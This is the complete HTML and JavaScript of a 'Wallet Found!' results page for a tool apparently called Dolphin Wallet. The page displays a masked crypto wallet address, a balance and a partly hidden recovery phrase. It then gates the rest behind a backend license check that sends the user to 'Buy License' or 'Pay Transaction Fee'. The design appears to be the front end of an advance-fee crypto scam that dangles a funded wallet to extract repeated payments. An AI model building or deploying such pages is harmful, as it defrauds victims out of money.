<!-- results.html - Wallet Found Display (Enhanced UI) -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Scan Result - Dolphin Wallet</title>
  <link rel="stylesheet" href="../assets/style-neon.css" />
  <script src="../config.js"></script>
  <style>
    body {
      background: radial-gradient(ellipse at center, #000010, #000);
      font-family: 'Orbitron', sans-serif;
      color: #0ff;
      margin: 0;
      padding: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      overflow: hidden;
    }
    .result-box {
      border: 1px solid #0ff4;
      padding: 40px;
      border-radius: 20px;
      background: rgba(0, 10, 20, 0.8);
      box-shadow: 0 0 30px #0ff4, inset 0 0 20px #0ff2;
      text-align: center;
      width: 95%;
      max-width: 720px;
      box-sizing: border-box;
    }
    h1 {
      font-size: 2em;
      margin-bottom: 20px;
    }
    .wallet-info {
      font-size: 1.1em;
      line-height: 1.6;
      margin-bottom: 20px;
    }
    .mnemonic {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
      gap: 10px;
      margin-top: 20px;
    }
    .mnemonic input {
      background: #000;
      border: 1px solid #0ff6;
      padding: 10px;
      border-radius: 8px;
      color: #0ff;
      text-align: center;
      font-family: monospace;
      font-size: 0.9em;
    }
    .btn {
      margin-top: 30px;
      padding: 12px 24px;
      font-size: 1em;
      color: #000;
      background: #0ff;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      transition: all 0.3s ease;
    }
    .btn:hover {
      background: #00faff;
      box-shadow: 0 0 12px #0ff;
    }
  </style>
</head>
<body>
  <div class="result-box">
    <h1>üéâ Wallet Found!</h1>
    <div class="wallet-info" id="walletInfo">Loading...</div>
    <div class="mnemonic" id="mnemonicWords"></div>
    <div id="actionArea"></div>
  </div>

  <script>
    function goToLicense() {
      window.location.href = "license.html";
    }

    const wallet = JSON.parse(localStorage.getItem("foundWallet"));
    const username = localStorage.getItem("username");

    if (wallet) {
      const maskedAddress = wallet.address.substring(0, 6) + "‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢" + wallet.address.slice(-4);
      document.getElementById("walletInfo").innerHTML = `
        <strong>Address:</strong><br>${maskedAddress}<br><br>
        <strong>Balance:</strong> ${wallet.balance} ${wallet.network === 'Bitcoin' ? 'BTC' : wallet.network === 'Ethereum' ? 'ETH' : wallet.network === 'Tron' ? 'TRX' : 'BNB'}<br>
        <strong>Network:</strong> ${wallet.network}<br>
        <strong>Last Transaction:</strong> ${wallet.lastTx}
      `;

      const words = wallet.mnemonic ? wallet.mnemonic.split(" ") : [];
      const maskedIndices = [2, 4, 5, 6, 8, 10];
      const wordInputs = words.map((word, index) => {
        return `<input type="text" readonly value="${maskedIndices.includes(index) ? '‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢' : word}" />`;
      }).join("");

      document.getElementById("mnemonicWords").innerHTML = wordInputs;

      // Check license status from backend
      fetch(`${BASE_URL}/license-status/${username}`)
        .then(res => res.json())
        .then(data => {
          const action = document.getElementById("actionArea");
          if (data.status === 'approved') {
            action.innerHTML = `<a href="transaction.html" class="btn">Next Step: Pay Transaction Fee</a>`;
          } else {
            action.innerHTML = `<a href="license.html" class="btn">Buy License</a><p style="color:orange; margin-top:10px">License payment is required to proceed.</p>`;
          }
        })
        .catch(() => {
          document.getElementById("actionArea").innerHTML = `<p style="color:red">Error checking license status</p>`;
        });

    } else {
      document.getElementById("walletInfo").innerHTML = "‚ùå No wallet data found.";
    }
  </script>
</body>
</html>
